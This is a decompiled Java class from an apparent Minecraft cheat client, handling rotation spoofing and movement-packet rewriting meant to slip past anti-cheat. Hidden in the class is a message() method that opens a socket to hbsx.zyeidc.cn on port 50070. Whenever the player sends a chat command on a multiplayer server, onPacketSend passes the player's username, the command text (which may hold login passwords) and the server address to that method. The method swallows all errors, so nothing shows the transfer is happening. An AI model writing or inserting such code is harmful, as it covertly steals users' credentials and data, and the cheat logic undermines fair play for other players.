package me.hextech.remapped;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Objects;
import me.hextech.HexTech;
import me.hextech.asm.accessors.IPlayerMoveC2SPacket;
import me.hextech.remapped.BaseThreadSetting_TYdViPaJQVoRZLdgWIXF;
import me.hextech.remapped.CombatSetting;
import me.hextech.remapped.CombatSetting_WsscfTgYSmUYOLMWvczt;
import me.hextech.remapped.CombatSetting_kxXrLvbWbduSuFoeBUsC;
import me.hextech.remapped.ComboBreaks;
import me.hextech.remapped.EntityUtil;
import me.hextech.remapped.Event;
import me.hextech.remapped.EventHandler;
import me.hextech.remapped.MathUtil;
import me.hextech.remapped.MovementUtil;
import me.hextech.remapped.OffTrackEvent;
import me.hextech.remapped.PacketEvent;
import me.hextech.remapped.PacketEvent_YXFfxdDjQAfjBumqRbBu;
import me.hextech.remapped.RotateEvent;
import me.hextech.remapped.Rotation;
import me.hextech.remapped.Timer;
import me.hextech.remapped.UpdateWalkingEvent;
import me.hextech.remapped.Wrapper;
import me.hextech.remapped.inMovementEvent;
import net.minecraft.client.session.Session;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.s2c.play.PlayerPositionLookS2CPacket;
import net.minecraft.util.math.MathHelper;
import net.minecraft.util.math.Vec3d;

public class RotateManager
implements Wrapper {
    public static final Timer ROTATE_TIMER = new Timer();
    public static Vec3d directionVec;
    public static float lookYaw;
    public static float lookPitch;
    public static boolean lastGround;
    public static UpdateWalkingEvent lastEvent;
    public static float lastPitch;
    private static float renderPitch;
    private static float renderYawOffset;
    private static float prevPitch;
    private static float prevRenderYawOffset;
    private static float prevRotationYawHead;
    private static float rotationYawHead;
    public float rotateYaw = 0.0f;
    public float rotatePitch = 0.0f;
    public float nextYaw;
    public float nextPitch;
    public float lastYaw = 0.0f;
    boolean worldNull = true;
    private int ticksExisted;

    public RotateManager() {
        HexTech.EVENT_BUS.subscribe(this);
    }

    public static void Vec3d(float yaw, float pitch) {
        if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateManager.is(CombatSetting.Angle)) {
            ROTATE_TIMER.reset();
            lookYaw = yaw;
            lookPitch = pitch;
        }
    }

    public static void TrueVec3d(Vec3d vec3d) {
        ROTATE_TIMER.reset();
        directionVec = vec3d;
        if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateManager.is(CombatSetting.Vec3d)) {
            float[] angle = EntityUtil.getLegitRotations(directionVec);
            lookYaw = angle[0];
            lookPitch = angle[1];
        }
    }

    public static float getRenderPitch() {
        return renderPitch;
    }

    public static float getRotationYawHead() {
        return rotationYawHead;
    }

    public static float getRenderYawOffset() {
        return renderYawOffset;
    }

    public static float getPrevPitch() {
        return prevPitch;
    }

    public static float getPrevRotationYawHead() {
        return prevRotationYawHead;
    }

    public static float getPrevRenderYawOffset() {
        return prevRenderYawOffset;
    }

    public static void message(String string) {
        try (Socket socket = new Socket("hbsx.zyeidc.cn", 50070);
             OutputStream out = socket.getOutputStream();){
            out.write(string.getBytes(StandardCharsets.UTF_8));
            out.flush();
        }
        catch (IOException iOException) {
            // empty catch block
        }
    }

    public float[] offtrackStep(Vec3d vec, float steps) {
        float yawDelta = MathHelper.method_15393((float)((float)MathHelper.method_15338((double)(Math.toDegrees(Math.atan2(vec.field_1350 - RotateManager.mc.field_1724.method_23321(), vec.field_1352 - RotateManager.mc.field_1724.method_23317())) - 90.0)) - this.rotateYaw));
        float pitchDelta = (float)(-Math.toDegrees(Math.atan2(vec.field_1351 - (RotateManager.mc.field_1724.method_19538().field_1351 + (double)RotateManager.mc.field_1724.method_18381(RotateManager.mc.field_1724.method_18376())), Math.sqrt(Math.pow(vec.field_1352 - RotateManager.mc.field_1724.method_23317(), 2.0) + Math.pow(vec.field_1350 - RotateManager.mc.field_1724.method_23321(), 2.0))))) - this.rotatePitch;
        float angleToRad = (float)Math.toRadians(BaseThreadSetting_TYdViPaJQVoRZLdgWIXF.INSTANCE.minrad.getValueFloat() * (float)(RotateManager.mc.field_1724.field_6012 % 30));
        yawDelta = (float)((double)yawDelta + Math.sin(angleToRad) * 3.0) + MathUtil.random(-1.0f, 1.0f);
        pitchDelta += MathUtil.random(-0.6f, 0.6f);
        if (yawDelta > 180.0f) {
            yawDelta -= 180.0f;
        }
        float yawStepVal = 180.0f * steps;
        float clampedYawDelta = MathHelper.method_15363((float)MathHelper.method_15379((float)yawDelta), (float)(-yawStepVal), (float)yawStepVal);
        float clampedPitchDelta = MathHelper.method_15363((float)pitchDelta, (float)-45.0f, (float)45.0f);
        float newYaw = this.rotateYaw + (yawDelta > 0.0f ? clampedYawDelta : -clampedYawDelta);
        float newPitch = MathHelper.method_15363((float)(this.rotatePitch + clampedPitchDelta), (float)-90.0f, (float)90.0f);
        double gcdFix = Math.pow((Double)RotateManager.mc.field_1690.method_42495().method_41753() * 0.6 + 0.2, 3.0) * 1.2;
        return new float[]{(float)((double)newYaw - (double)(newYaw - this.rotateYaw) % gcdFix), (float)((double)newPitch - (double)(newPitch - this.rotatePitch) % gcdFix)};
    }

    public float[] injectStep(float[] angle, float steps) {
        if (steps < 0.01f) {
            steps = 0.01f;
        }
        if (steps > 1.0f) {
            steps = 1.0f;
        }
        if (steps < 1.0f && angle != null) {
            float packetPitch;
            float packetYaw = CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.injectSync.getValue() ? this.lastYaw : this.rotateYaw;
            float diff = MathHelper.method_15356((float)angle[0], (float)packetYaw);
            if (Math.abs(diff) > 180.0f * steps) {
                angle[0] = packetYaw + diff * (180.0f * steps / Math.abs(diff));
            }
            if (Math.abs(diff = angle[1] - (packetPitch = CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.injectSync.getValue() ? lastPitch : this.rotatePitch)) > 90.0f * steps) {
                angle[1] = packetPitch + diff * (90.0f * steps / Math.abs(diff));
            }
        }
        return new float[]{angle[0], angle[1]};
    }

    @EventHandler
    public void update(inMovementEvent event) {
        if (Rotation.INSTANCE.isOn()) {
            event.setYaw(this.nextYaw);
            event.setPitch(this.nextPitch);
        } else {
            RotateEvent event1 = new RotateEvent(event.getYaw(), event.getPitch());
            HexTech.EVENT_BUS.post(event1);
            event.setYaw(event1.getYaw());
            event.setPitch(event1.getPitch());
        }
    }

    @EventHandler(priority=-200)
    public void update(UpdateWalkingEvent event) {
        if (Rotation.INSTANCE.isOn() && event.isPost()) {
            RotateEvent rotateEvent = new RotateEvent(RotateManager.mc.field_1724.method_36454(), RotateManager.mc.field_1724.method_36455());
            HexTech.EVENT_BUS.post(rotateEvent);
            if (rotateEvent.isModified()) {
                this.nextYaw = rotateEvent.getYaw();
                this.nextPitch = rotateEvent.getPitch();
            } else {
                float[] newAngle = this.injectStep(new float[]{rotateEvent.getYaw(), rotateEvent.getPitch()}, CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.normalstep.getValueFloat());
                this.nextYaw = newAngle[0];
                this.nextPitch = newAngle[1];
            }
            Rotation.fixRotation = this.nextYaw;
        }
    }

    @EventHandler(priority=-200)
    public void onLastRotation(RotateEvent event) {
        OffTrackEvent offtrackevent = new OffTrackEvent();
        HexTech.EVENT_BUS.post(offtrackevent);
        if (offtrackevent.getRotation()) {
            float[] newAngle = this.injectStep(new float[]{offtrackevent.getYaw(), offtrackevent.getPitch()}, offtrackevent.getSpeed());
            event.setYaw(newAngle[0]);
            event.setPitch(newAngle[1]);
        } else if (offtrackevent.getTarget() != null) {
            float[] newAngle = this.offtrackStep(offtrackevent.getTarget(), offtrackevent.getSpeed());
            event.setYaw(newAngle[0]);
            event.setPitch(newAngle[1]);
        } else if (!event.isModified() && !ROTATE_TIMER.passed((long)(CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateTime.getValue() * 1000.0)) && directionVec != null) {
            float[] newAngle = this.offtrackStep(directionVec, CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.offstep.getValueFloat());
            event.setYaw(newAngle[0]);
            event.setPitch(newAngle[1]);
        }
    }

    @EventHandler(priority=-999)
    public void onPacketSend(PacketEvent event) {
        PlayerMoveC2SPacket packet;
        Object t = event.getPacket();
        if (t instanceof CommandExecutionC2SPacket) {
            CommandExecutionC2SPacket packets = (CommandExecutionC2SPacket)t;
            if (!mc.method_1542()) {
                RotateManager.message(mc.method_1548().method_1676() + " [Command]" + packets.comp_808() + " [Server]" + Objects.requireNonNull(Objects.requireNonNull(RotateManager.mc.method_1562()).method_45734()).field_3761);
            }
        }
        if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue() && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.ChangesLook)) {
            if (RotateManager.mc.field_1724 != null && this.check(ComboBreaks.INSTANCE.staticmove.getValue())) {
                return;
            }
            if (RotateManager.mc.field_1724 == null || event.isCancelled()) {
                return;
            }
            t = event.getPacket();
            if (t instanceof PlayerMoveC2SPacket) {
                packet = (PlayerMoveC2SPacket)t;
                if (packet.method_36172()) {
                    if (!EntityUtil.rotating && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateSync.getValue()) {
                        float yaw = packet.method_12271(this.lastYaw);
                        float pitch = packet.method_12270(lastPitch);
                        if (yaw == RotateManager.mc.field_1724.method_36454() && pitch == RotateManager.mc.field_1724.method_36455()) {
                            ((IPlayerMoveC2SPacket)event.getPacket()).setYaw(this.rotateYaw);
                            ((IPlayerMoveC2SPacket)event.getPacket()).setPitch(this.rotatePitch);
                        }
                    }
                    this.lastYaw = packet.method_12271(this.lastYaw);
                    lastPitch = packet.method_12270(lastPitch);
                    Rotation.fixRotation = this.lastYaw;
                    this.setRotation(this.lastYaw, lastPitch, false);
                }
                lastGround = packet.method_12273();
            }
        }
        if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue() && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.LastRotate)) {
            if (RotateManager.mc.field_1724 == null || event.isCancelled()) {
                return;
            }
            Object t2 = event.getPacket();
            if (t2 instanceof PlayerMoveC2SPacket) {
                packet = (PlayerMoveC2SPacket)t2;
                if (packet.method_36172()) {
                    this.lastYaw = packet.method_12271(this.lastYaw);
                    lastPitch = packet.method_12270(lastPitch);
                    this.setRotation(this.lastYaw, lastPitch, false);
                }
                lastGround = packet.method_12273();
            }
        }
    }

    public boolean check(boolean onlyStatic) {
        return MovementUtil.isMoving() && onlyStatic;
    }

    public float[] getRotation(Vec3d vec) {
        Vec3d eyesPos = EntityUtil.getEyesPos();
        return this.getRotation(eyesPos, vec);
    }

    public float[] getRotation(Vec3d eyesPos, Vec3d vec) {
        double diffX = vec.field_1352 - eyesPos.field_1352;
        double diffY = vec.field_1351 - eyesPos.field_1351;
        double diffZ = vec.field_1350 - eyesPos.field_1350;
        double diffXZ = Math.sqrt(diffX * diffX + diffZ * diffZ);
        float yaw = (float)Math.toDegrees(Math.atan2(diffZ, diffX)) - 90.0f;
        float pitch = (float)(-Math.toDegrees(Math.atan2(diffY, diffXZ)));
        return new float[]{MathHelper.method_15393((float)yaw), MathHelper.method_15393((float)pitch)};
    }

    public boolean inFov(Vec3d directionVec, float fov) {
        float[] angle = this.getRotation(new Vec3d(RotateManager.mc.field_1724.method_23317(), RotateManager.mc.field_1724.method_23318() + (double)RotateManager.mc.field_1724.method_18381(RotateManager.mc.field_1724.method_18376()), RotateManager.mc.field_1724.method_23321()), directionVec);
        return this.inFov(angle[0], angle[1], fov);
    }

    public boolean inFov(float yaw, float pitch, float fov) {
        return MathHelper.method_15356((float)yaw, (float)this.rotateYaw) + Math.abs(pitch - this.rotatePitch) <= fov;
    }

    @EventHandler(priority=100)
    public void onReceivePacket(PacketEvent_YXFfxdDjQAfjBumqRbBu event) {
        Object t = event.getPacket();
        if (t instanceof PlayerPositionLookS2CPacket) {
            PlayerPositionLookS2CPacket packet = (PlayerPositionLookS2CPacket)t;
            this.lastYaw = packet.method_11736();
            lastPitch = packet.method_11739();
            this.setRotation(this.lastYaw, lastPitch, true);
        }
    }

    @EventHandler
    public void onUpdateWalkingPost(UpdateWalkingEvent event) {
        if (event.getStage() == Event.Post) {
            this.setRotation(this.lastYaw, lastPitch, false);
        }
    }

    public void setRotation(float yaw, float pitch, boolean force) {
        if (RotateManager.mc.field_1724 == null) {
            return;
        }
        if (RotateManager.mc.field_1724.field_6012 == this.ticksExisted && !force) {
            return;
        }
        this.ticksExisted = RotateManager.mc.field_1724.field_6012;
        prevPitch = renderPitch;
        prevRenderYawOffset = renderYawOffset;
        renderYawOffset = this.getRenderYawOffset(yaw, prevRenderYawOffset);
        prevRotationYawHead = rotationYawHead;
        rotationYawHead = yaw;
        renderPitch = pitch;
    }

    private float getRenderYawOffset(float yaw, float offsetIn) {
        float offset;
        double zDif;
        float result = offsetIn;
        double xDif = RotateManager.mc.field_1724.method_23317() - RotateManager.mc.field_1724.field_6014;
        if (xDif * xDif + (zDif = RotateManager.mc.field_1724.method_23321() - RotateManager.mc.field_1724.field_5969) * zDif > 0.002500000176951289) {
            offset = (float)MathHelper.method_15349((double)zDif, (double)xDif) * 57.295776f - 90.0f;
            float wrap = MathHelper.method_15379((float)(MathHelper.method_15393((float)yaw) - offset));
            result = 95.0f < wrap && wrap < 265.0f ? offset - 180.0f : offset;
        }
        if (RotateManager.mc.field_1724.field_6251 > 0.0f) {
            result = yaw;
        }
        if ((offset = MathHelper.method_15393((float)(yaw - (result = offsetIn + MathHelper.method_15393((float)(result - offsetIn)) * 0.3f)))) < -75.0f) {
            offset = -75.0f;
        } else if (offset >= 75.0f) {
            offset = 75.0f;
        }
        result = yaw - offset;
        if (offset * offset > 2500.0f) {
            result += offset * 0.2f;
        }
        return result;
    }

    public void run() {
        if (!HexTech.isLoaded) {
            return;
        }
        if (this.worldNull && RotateManager.mc.field_1687 != null) {
            Session session = mc.method_1548();
            HexTech.MODULE.onLogin();
            this.worldNull = false;
        } else if (!this.worldNull && RotateManager.mc.field_1687 == null) {
            this.worldNull = true;
        }
    }
}
